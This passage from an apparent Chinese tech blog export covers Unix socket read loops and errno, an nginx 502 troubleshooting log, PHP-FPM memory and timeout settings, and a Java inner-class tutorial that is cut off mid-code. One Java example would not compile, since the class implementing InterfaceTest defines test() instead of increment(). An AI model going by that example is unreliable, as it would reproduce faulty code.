<p>当应用程序要从某个 TCP 套接字数据结构 (或对应的由操作系统维护的缓冲区中) 读取由对端发送的完整数据时，由于应用程序单次调用 read () 并不能确保从操作系统缓冲区中读取完所有发送端的数据，所以通常将 read () 调用放进一个循环。</p>
<p>当 read () 调用返回 0 (表示缓冲区中已无待读取的数据)；</p>
<p>或返回小于 0 (表示 read () 调用发生错误) 则结束该循环。</p>
<hr>
<p>Unix socket API 函数与 Unix 线程函数 的错误处理对比</p>
<p>Unix socket API 函数发生错误时：</p>
<p>√把全局变量 errno 的值设置为标识该错误类型的整型正值。</p>
<p>√该 socket API 函数本身返回 - 1。</p>
<p>Unix 线程函数 (以 pthread_开头的函数) 发生错误时：</p>
<p>√不会把标识该错误类型的整型正值保存在全局变量 errno 中。</p>
<p>√该线程函数本身返回标识该错误类型的整型正值。</p>
<p>由此可见，对于线程函数，必须额外定义一个整型变量来保存其返回的错误类型标识值。并把其值赋给全局变量 errno。</p>
<p>这样，后续调用 err_sys () 函数时，它才能根据 errno 的值 (错误类型) 来输出相应的出错提示消息。</p>
<p>在 &lt;sys&#x2F;errno.h&gt; 系统头文件中定义了所有 Unix 系统错误常量 (以 E 开头的全大写字面值) 对应的整型错误类型标识值。</p>
<p>综上所述，“connect () 返回 ECONNREFUSED” 这种描述形式表明：</p>
<p>√这是一个标准的 Unix socket API 函数；</p>
<p>√调用 connect 函数时发生错误，该函数本身返回 - 1;</p>
<p>√该函数将全局变量 errno 的值设为 ECONNREFUSED 字面值常量对应的整型错误类型标识值。这个值应该与 &lt;sys&#x2F;errno.h&gt; 系统头文件中定义 ECONNREFUSED 的值相符。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Socket</tag>
      </tags>
  </entry>
  <entry>
    <title>网站出现 502 BAD GATEWAY 的解决办法</title>
    <url>/2017/12/nginx-php-fpm/</url>
    <content><![CDATA[<h2 id="出现-502-bad-gateway-错误的原因"><a href="#出现-502-bad-gateway-错误的原因" class="headerlink" title="出现 502 bad gateway 错误的原因"></a>出现 502 bad gateway 错误的原因</h2><ol>
<li>PHP-FPM 进程数不够用</li>
<li>Linux 内核打开文件数量小</li>
<li>脚本执行时间超时</li>
<li>缓存设置比较小</li>
</ol>
<span id="more"></span>

<p>网站间歇性出现 502，第一反应不是程序的问题，而是 nginx 服务器的问题，因为这是代理服务器出现的问题，代理服务器并没有安装 php 排除第一中情况。</p>
<p>于此想到的是可能是超时，所以我把超时修改了一些<br>一下是服务器原配置 (重点配置)</p>
<h2 id="http-部分"><a href="#http-部分" class="headerlink" title="http 部分"></a>http 部分</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">server_names_hash_bucket_size</span> <span class="number">64</span>;</span><br><span class="line"><span class="attribute">client_header_buffer_size</span> <span class="number">128</span>k;</span><br><span class="line"><span class="attribute">large_client_header_buffers</span> <span class="number">4</span> <span class="number">32</span>k;</span><br><span class="line"><span class="attribute">client_max_body_size</span> <span class="number">50</span>m;</span><br><span class="line"></span><br><span class="line"><span class="attribute">keepalive_timeout</span> <span class="number">60</span>;</span><br><span class="line"><span class="attribute">fastcgi_connect_timeout</span> <span class="number">60</span>;</span><br><span class="line"><span class="attribute">fastcgi_send_timeout</span> <span class="number">60</span>;</span><br><span class="line"><span class="attribute">fastcgi_read_timeout</span> <span class="number">600</span>;</span><br><span class="line"><span class="attribute">fastcgi_buffer_size</span> <span class="number">64</span>k;</span><br><span class="line"><span class="attribute">fastcgi_buffers</span> <span class="number">4</span> <span class="number">128</span>k;</span><br><span class="line"><span class="attribute">fastcgi_busy_buffers_size</span> <span class="number">128</span>k;</span><br><span class="line"><span class="attribute">fastcgi_temp_file_write_size</span> <span class="number">256</span>k;</span><br><span class="line"></span><br><span class="line"><span class="attribute">gzip_buffers</span> <span class="number">4</span> <span class="number">128</span>k;</span><br></pre></td></tr></table></figure>

<h2 id="server-部分"><a href="#server-部分" class="headerlink" title="server 部分"></a>server 部分</h2><figure class="highlight tp"><table><tr><td class="code"><pre><span class="line">upstream myweb &#123;</span><br><span class="line">    server <span class="number">10</span><span class="number">.10</span><span class="number">.10</span><span class="number">.1</span>:<span class="number">80</span> max_fails=<span class="number">3</span> fail_timeout=<span class="number">30</span>s;</span><br><span class="line">    server <span class="number">10</span><span class="number">.10</span><span class="number">.10</span><span class="number">.2</span>:<span class="number">80</span> max_fails=<span class="number">3</span> fail_timeout=<span class="number">30</span>s;</span><br><span class="line">    ip_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">    proxy_pass http:<span class="comment">//myweb;</span></span><br><span class="line">    proxy_next_upstream error timeout invalid_header http_<span class="number">500</span> http_<span class="number">502</span> http_<span class="number">503</span>;</span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">    proxy_set_header <span class="keyword">X</span>-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    proxy_set_header <span class="keyword">X</span>-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    proxy_set_header <span class="keyword">X</span>-Forwarded-Proto https;</span><br><span class="line">    proxy_redirect off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>第一步修改超时 只改了 http 部分 缓冲基本上都加了几倍</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">server_names_hash_bucket_size</span> <span class="number">512</span>;</span><br><span class="line"><span class="attribute">client_header_buffer_size</span> <span class="number">512</span>k;</span><br><span class="line"><span class="attribute">large_client_header_buffers</span> <span class="number">16</span> <span class="number">128</span>k;</span><br><span class="line"><span class="attribute">client_max_body_size</span> <span class="number">256</span>m;</span><br><span class="line"></span><br><span class="line"><span class="attribute">keepalive_timeout</span> <span class="number">600</span>;</span><br><span class="line"><span class="attribute">fastcgi_connect_timeout</span> <span class="number">600</span>;</span><br><span class="line"><span class="attribute">fastcgi_send_timeout</span> <span class="number">600</span>;</span><br><span class="line"><span class="attribute">fastcgi_read_timeout</span> <span class="number">600</span>;</span><br><span class="line"><span class="attribute">fastcgi_buffer_size</span> <span class="number">256</span>k;</span><br><span class="line"><span class="attribute">fastcgi_buffers</span> <span class="number">16</span> <span class="number">512</span>k;</span><br><span class="line"><span class="attribute">fastcgi_busy_buffers_size</span> <span class="number">512</span>k;</span><br><span class="line"><span class="attribute">fastcgi_temp_file_write_size</span> <span class="number">1024</span>k;</span><br><span class="line"></span><br><span class="line"><span class="attribute">gzip_buffers</span> <span class="number">16</span> <span class="number">512</span>k;</span><br></pre></td></tr></table></figure>

<p>观察 nginx 出现 502 的频率并没有下降，还是和以前一样</p>
<p>第二步修改 server 代理服务超时</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://myweb;</span><br><span class="line">    <span class="attribute">proxy_next_upstream</span> <span class="literal">error</span> timeout invalid_header http_500 http_502 http_503;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-Proto https;</span><br><span class="line">    <span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">proxy_connect_timeout</span> <span class="number">300s</span>;</span><br><span class="line">    <span class="attribute">proxy_send_timeout</span> <span class="number">300s</span>;</span><br><span class="line">    <span class="attribute">proxy_read_timeout</span> <span class="number">300s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察 nginx502 的频率有一点下降，没有达到预期效果于是更改代理的缓冲区</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://myweb;</span><br><span class="line">    <span class="attribute">proxy_next_upstream</span> <span class="literal">error</span> timeout invalid_header http_500 http_502 http_503;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-Proto http;</span><br><span class="line">    <span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">proxy_connect_timeout</span> <span class="number">300s</span>;</span><br><span class="line">    <span class="attribute">proxy_send_timeout</span> <span class="number">300s</span>;</span><br><span class="line">    <span class="attribute">proxy_read_timeout</span> <span class="number">300s</span>;</span><br><span class="line">    <span class="attribute">proxy_buffer_size</span> <span class="number">512k</span>;</span><br><span class="line">    <span class="attribute">proxy_buffers</span> <span class="number">32</span> <span class="number">512k</span>;</span><br><span class="line">    <span class="attribute">proxy_busy_buffers_size</span> <span class="number">512k</span>;</span><br><span class="line">    <span class="attribute">proxy_temp_file_write_size</span> <span class="number">512k</span>;</span><br><span class="line">    <span class="attribute">proxy_ignore_client_abort</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察 nginx502 的频率和刚才一样，并没有明显效果。打开 nginx 的错误日志，观察错误状态，nginx 错误日志显示</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[<span class="built_in">error</span>] 20435#0: <span class="number">*3890606</span> <span class="literal">no</span> live upstreams <span class="keyword">while</span> connecting <span class="keyword">to</span> upstream, client:</span><br></pre></td></tr></table></figure>

<hr>
<p>意思是 nginx 发现没有存活的后端了，后端有两台服务器，这怎么可能</p>
<p>猜想 nginx 在等待后端服务器返回的时候做了判断，如果后端服务器响应慢就有可能踢掉后端服务器，因此就可能把后端的两台服务器都踢掉</p>
<p>所以问题是出在 upstream 配置，原来配置中的 max_fails&#x3D;3 fail_timeout&#x3D;30s; 是默认的配置</p>
<p>我尝试修改 max_fails&#x3D;10 fail_timeout&#x3D;60s; 观察 nginx 出现 502 的频率下降了很多，但是如果出现 502 就时间比较久。以下是 upstream 最终配置</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">upstream myweb &#123;</span><br><span class="line">   <span class="built_in"> server </span>10.10.10.1:80 <span class="attribute">max_fails</span>=60 <span class="attribute">fail_timeout</span>=10s;</span><br><span class="line">   <span class="built_in"> server </span>10.10.10.2:80 <span class="attribute">max_fails</span>=60 <span class="attribute">fail_timeout</span>=10s;</span><br><span class="line">    ip_hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来可能的优化 调高调高 linux 内核打开文件数量备注一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ‘<span class="built_in">ulimit</span> -HSn 65536′ &gt;&gt; /etc/profile</span><br><span class="line"><span class="built_in">echo</span> ‘<span class="built_in">ulimit</span> -HSn 65536′ &gt;&gt; /etc/rc.local</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>PHP-FPM</tag>
      </tags>
  </entry>
  <entry>
    <title>查看 PHP-FPM 内存占用命令</title>
    <url>/2017/12/php-php-fpm/</url>
    <content><![CDATA[<h2 id="查看PHP-FPM内存占用的几个有用小命令，记录如下"><a href="#查看PHP-FPM内存占用的几个有用小命令，记录如下" class="headerlink" title="查看PHP-FPM内存占用的几个有用小命令，记录如下"></a>查看PHP-FPM内存占用的几个有用小命令，记录如下</h2><ol>
<li>查看每个FPM的内存占用：<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">ps</span> -ylC php-fpm --<span class="keyword">sor</span><span class="variable">t:rss</span></span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>

<p>当然，在后后面加 | wc -l可查看系统当前FPM总进程数</p>
<p>单个进程占用23M内存大小；</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">S</span>   UID   PID  PPID  C PRI  NI   RSS    SZ WCHAN  TTY          TIME CMD</span><br><span class="line"></span><br><span class="line"><span class="attribute">S</span>     <span class="number">0</span>   <span class="number">627</span>     <span class="number">1</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span>   <span class="number">848</span>  <span class="number">6205</span> ep_pol ?        <span class="number">00</span>:<span class="number">01</span>:<span class="number">09</span> php-fpm</span><br><span class="line"></span><br><span class="line"><span class="attribute">S</span>   <span class="number">501</span>  <span class="number">6685</span>   <span class="number">627</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span> <span class="number">23392</span> <span class="number">10858</span> skb_re ?        <span class="number">00</span>:<span class="number">01</span>:<span class="number">21</span> php-fpm</span><br><span class="line"></span><br><span class="line"><span class="attribute">S</span>   <span class="number">501</span>  <span class="number">6684</span>   <span class="number">627</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span> <span class="number">23536</span> <span class="number">10808</span> skb_re ?        <span class="number">00</span>:<span class="number">01</span>:<span class="number">17</span> php-fpm</span><br><span class="line"></span><br><span class="line"><span class="attribute">S</span>   <span class="number">501</span>  <span class="number">6915</span>   <span class="number">627</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span> <span class="number">24752</span> <span class="number">10911</span> skb_re ?        <span class="number">00</span>:<span class="number">01</span>:<span class="number">12</span> php-fpm</span><br></pre></td></tr></table></figure>

<p>查看连接数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ps -ylC php-fpm --<span class="built_in">sort</span>:rss|<span class="built_in">wc</span> -l</span></span><br><span class="line"></span><br><span class="line">// 5</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看PHP-FPM在你的机器上的平均内存占用：</li>
</ol>
<p><strong>命令如下：</strong></p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">$ ps --no-headers -o <span class="string">&quot;rss,cmd&quot;</span> -C php-fpm | <span class="type">awk</span> &#x27;&#123; <span class="built_in">sum</span>+=$<span class="number">1</span> &#125; END &#123; printf (<span class="string">&quot;%d%s\\n&quot;</span>, <span class="built_in">sum</span>/NR/<span class="number">1024</span>,<span class="string">&quot;M&quot;</span>) &#125;&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>平均内存为17M大小；</strong></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">$ ps --<span class="keyword">no</span>-headers -o <span class="string">&quot;rss,cmd&quot;</span> -C php-fpm | awk &#x27;&#123; <span class="keyword">sum</span>+=<span class="variable">$1</span> &#125; END &#123; printf (<span class="string">&quot;%d%s\\n&quot;</span>, <span class="keyword">sum</span>/NR/1024,<span class="string">&quot;M&quot;</span>) &#125;&#x27;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 17M</span></span><br></pre></td></tr></table></figure>


<p><strong>查看 80 端口 链接数量；</strong></p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">$ netstat -<span class="keyword">ant</span> |<span class="keyword">grep</span> <span class="number">80</span> |wc -l</span><br><span class="line"></span><br><span class="line"><span class="comment">// 101</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>PHP-FPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Php 和 PHP-FPM 配置超时时间</title>
    <url>/2017/12/php-php-fpm1/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>PHP 限定脚本执行时长的方式有几种，下面说下 php.ini 中的 max_execution_time 和 php-fpm.conf 中的 request_terminate_timeout</p>
<span id="more"></span>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## <span class="number">1.</span> php.ini 中的 max_execution_time</span><br></pre></td></tr></table></figure>
<p>; Maximum execution time of each script, in seconds<br>; <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWF4LWV4ZWN1dGlvbi10aW1l">http://php.net/max-execution-time<i class="fa fa-external-link-alt"></i></span><br>; Note: This directive is hardcoded to 0 for the CLI SAPI<br>max_execution_time &#x3D; 1</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">上面是 php<span class="selector-class">.ini</span> 配置文件中的 max_execution_time 及其说明，上面说了，这个值限定了脚本的最大执行时间 (单位是秒)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set_time_limit</span>() 函数和配置指令 max_execution_time 只影响脚本本身执行的时间。任何发生在诸如使用 system () 的系统调用，流操作，数据库操作等的脚本执行的最大时间不包括其中，当该脚本已运行。在测量时间是实值的 Windows 中，情况就不是如此了。</span><br><span class="line"> </span><br><span class="line">## <span class="number">2</span>. php-fpm<span class="selector-class">.conf</span> 中的 request_terminate_timeout</span><br></pre></td></tr></table></figure>
<p>; The timeout for serving a single request after which the worker process will<br>; be killed. This option should be used when the ‘max_execution_time’ ini option<br>; does not stop script execution for some reason. A value of ‘0’ means ‘off’.<br>; Available units: s(econds)(default), m(inutes), h(ours), or d(ays)<br>; Default Value: 0<br>;request_terminate_timeout &#x3D; 0<br>request_terminate_timeout &#x3D; 4s</p>
<pre><code>
设置单个请求的超时中止时间。该选项可能会对 php.ini 设置中的 max_execution_time 因为某些特殊原因没有中止运行的脚本有用。设置为 ‘0’ 表示 ‘Off’。可用单位：s（秒），m（分），h（小时）或者 d（天）。默认单位：s（秒）。默认值：0（关闭）。

通过上面两个说明及实验验证得出结论，max_execution_time=1，不一定 1s 后就会中止脚本，可能是 2s、3s 甚至更长的时间；而 request_terminate_timeout=4 则就会在 4s 后中止脚本的执行。所以在配置超时时间的时候，最好两个都配置，max_execution_time 时间短一点，而 request_terminate_timeout 时间长一点
</code></pre>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>PHP-FPM</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA 内部类作用</title>
    <url>/2019/06/java-class/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>推荐一、 定义</p>
<p>    放在一个类的内部的类我们就叫内部类。</p>
<span id="more"></span>

<p>二、 作用</p>
<p>    1．内部类可以很好的实现隐藏，一般的非内部类，是不允许有 private 与protected权限的，但内部类可以</p>
<p>    2．内部类拥有外围类的所有元素的访问权限</p>
<p>    3．可是实现多重继承</p>
<p>    4．可以避免修改接口而实现同一个类中两种同名方法的调用。</p>
<p>三、   例子</p>
<p>    1．实现隐藏</p>
<p>       平时我们对类的访问权限，都是通过类前面的访问修饰符来限制的，一般的非内部类，是不允许有 private 与protected权限的，但内部类可以，所以我们能通过内部类来隐藏我们的信息。可以看下面的例子</p>
<p>    接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InterfaceTest</span> &#123;</span><br><span class="line">　　<span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>    具体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">　　 <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">InsideClass</span> <span class="keyword">implements</span> <span class="title class_">InterfaceTest</span> &#123;</span><br><span class="line">　　     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">　　　　      System.out.println(<span class="string">&quot;这是一个测试&quot;</span>);</span><br><span class="line">　　     &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> InterfaceTest <span class="title function_">getIn</span><span class="params">()</span> &#123;</span><br><span class="line">　　　　　<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InsideClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>    客户端程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestExample</span> &#123;</span><br><span class="line">　　<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">　　　　 Example a=<span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line">　　　　 InterfaceTest a1=a.getIn();</span><br><span class="line">　　　　 a1.test();</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>　　从这段代码里面我只知道Example的, getIn()方法能返回一个InterfaceTest 实例但我并不知道这个实例是这么实现的。而且由于InsideClass 是private的，所以我们如果不看代码的话根本看不到这个具体类的名字，所以说它可以很好的实现隐藏。</p>
<p>    2. 可以无条件地访问外围类的所有元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TagBean</span> &#123;</span><br><span class="line">　　<span class="keyword">private</span> String name=<span class="string">&quot;liutao&quot;</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">InTest</span> &#123;</span><br><span class="line">　　　　<span class="keyword">public</span> <span class="title function_">InTest</span><span class="params">()</span> &#123;</span><br><span class="line">　　　　    System.out.println(name);</span><br><span class="line">       &#125;</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;<span class="keyword">new</span> <span class="title class_">InTest</span>();　&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">　　　　TagBean bb=<span class="keyword">new</span> <span class="title class_">TagBean</span>();</span><br><span class="line">　　　　bb.test();</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>     name这个变量是在TagBean里面定义的私有变量。这个变量在内部类中可以无条件地访问 System.out.println(name);</p>
<p>     3. 可以实现多重继承</p>
<p>        个特点非常重要，个人认为它是内部类存在的最大理由之一。正是由于他的存在使得Java的继承机制更加完善。大家都知道Java只能继承一个类，它的多重继承在我们没有学习内部类之前是用接口来实现的。但使用接口有时候有很多不方便的地方。比如我们实现一个接口就必须实现它里面的所有方法。而有了内部类就不一样了。它可以使我们的类继承多个具体类或抽象类。大家看下面的例子。</p>
<p>    类一</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example1</span> &#123;</span><br><span class="line">　　<span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span> &#123;</span><br><span class="line">　　　　<span class="keyword">return</span> <span class="string">&quot;liutao&quot;</span>;</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>    类二</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example2</span> &#123;</span><br><span class="line">　　<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">age</span><span class="params">()</span> &#123;</span><br><span class="line">　　　　<span class="keyword">return</span> <span class="number">25</span>;</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>    类三</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainExample</span> &#123;</span><br><span class="line"></span><br><span class="line">　　<span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">test1</span> <span class="keyword">extends</span> <span class="title class_">Example1</span> &#123;</span><br><span class="line">　　　　<span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span> &#123;</span><br><span class="line">　　　　　　<span class="keyword">return</span> <span class="built_in">super</span>.name();</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">test2</span> <span class="keyword">extends</span> <span class="title class_">Example2</span> &#123;</span><br><span class="line"></span><br><span class="line">　　　　<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">age</span><span class="params">()</span> &#123;　<span class="keyword">return</span> <span class="built_in">super</span>.age();  &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span> &#123;</span><br><span class="line">　　　　<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">test1</span>().name();  </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">age</span><span class="params">()</span> &#123;</span><br><span class="line">　　　　<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">test2</span>().age();   </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">       MainExample mi=<span class="keyword">new</span> <span class="title class_">MainExample</span>();</span><br><span class="line">       System.out.println(<span class="string">&quot;姓名:&quot;</span>+mi.name());</span><br><span class="line">       System.out.println(<span class="string">&quot;年龄:&quot;</span>+mi.age());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>　　大家注意看类三，里面分别实现了两个内部类 test1,和test2 ，test1类又继承了Example1，test2继承了Example2，这样我们的类三MainExample就拥有了Example1和Example2的方法和属性，也就间接地实现了多继承。</p>
<p>四、 避免修改接口而实现同一个类中两种同名方法的调用。</p>
<p>     大家假想一下如果，你的类要继承一个类，还要实现一个接口，可是你发觉你继承的类和接口里面有两个同名的方法怎么办？你怎么区分它们？？这就需要我们的内部类了。看下面的代码</p>
<p>    接口 Incrementable</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Incrementable</span> &#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>    类 MyIncrement  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyIncrement</span> &#123;</span><br><span class="line">　　<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Other increment()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">(MyIncrement f)</span>  &#123;</span><br><span class="line">        f.increment();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>    大家看上面加黑的部分，两个方法都是一样的。在看下面这个类要继承这两个类</p>
<p>    如果不用内部类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Callee2</span> <span class="keyword">extends</span> <span class="title class_">MyIncrement</span> <span class="keyword">implements</span> <span class="title class_">Incrementable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>    想问一下大家increment()这个方法是属于覆盖MyIncrement这里的方法呢？还是Incrementable这里的方法。我怎么能调到MyIncrement这里的方法？显然这是不好区分的。而我们如果用内部类就很好解决这一问题了。看下面代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> insidecategory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Callee2</span> <span class="keyword">extends</span> <span class="title class_">MyIncrement</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">incr</span><span class="params">()</span> &#123;</span><br><span class="line">        i++;</span><br><span class="line">        System.out.println(i);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Closure</span> <span 